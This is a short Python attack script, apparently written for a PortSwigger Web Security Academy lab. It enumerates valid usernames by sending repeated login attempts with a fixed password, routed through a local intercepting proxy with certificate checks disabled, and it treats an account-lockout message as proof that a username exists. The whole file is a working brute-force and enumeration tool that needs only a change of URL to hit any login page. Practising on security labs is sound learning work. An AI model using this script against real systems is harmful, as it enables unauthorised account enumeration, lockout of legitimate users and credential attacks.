import requests 
import urllib3

# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0acf009504b7088e8164998100fc0061.web-security-academy.net/login"
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
password_payload = "Password123"
usernames=[]
with open("username.txt",'r') as file:
    for i in file:
        usernames.append(i.strip())
print(usernames)

for item in usernames:
     for k in range(0,5):
        data = {"username":item,"password":password_payload}
        print(data)
        response= requests.post(url,verify=False,proxies=proxies,data=data)
        if "You have made too many incorrect login attempts" in response.text:
                print("correct_username is",item)
                break 
        
        
